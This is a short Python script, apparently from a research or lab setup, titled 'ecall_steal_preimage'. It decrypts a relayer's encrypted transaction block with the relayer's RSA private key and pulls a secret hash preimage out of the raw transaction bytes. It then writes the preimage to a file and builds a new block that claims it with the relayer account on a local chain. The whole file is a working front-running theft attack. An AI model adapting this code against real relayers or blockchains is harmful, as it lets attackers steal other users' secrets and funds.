

from web3 import Web3, HTTPProvider
from web3.middleware import geth_poa_middleware
from Crypto.PublicKey import RSA

from utils import enc_block_path, decrypt_block, relayer_private_key_path, bytes_to_int, hex_to_bytes, wrap_new_block, local_url, get_account

preimage_path = f'/output/preimage.txt'

def ecall_steal_preimage():
    with open(enc_block_path, 'r') as f:
        encrypted_block = eval(f.readline())
    private_key = RSA.import_key(open(relayer_private_key_path).read())

    block = decrypt_block(encrypted_block, private_key)
    for signed_tx in block.tx_list:
        raw_tx = signed_tx.rawTransaction.hex()
        hex_preimage = raw_tx[80: 80+64]
        preimage = bytes_to_int(hex_to_bytes(hex_preimage))
    with open(preimage_path, "w") as f:
        f.write(f"{preimage}")
    w3 = Web3(HTTPProvider(local_url))
    w3.middleware_onion.inject(geth_poa_middleware, layer=0)
    relayer_account = get_account(w3, 'relayer')

    block =  wrap_new_block(w3, preimage, relayer_account)
    block.apply(w3)
    print(f"relayer_addr {relayer_account.address}")


           
ecall_steal_preimage()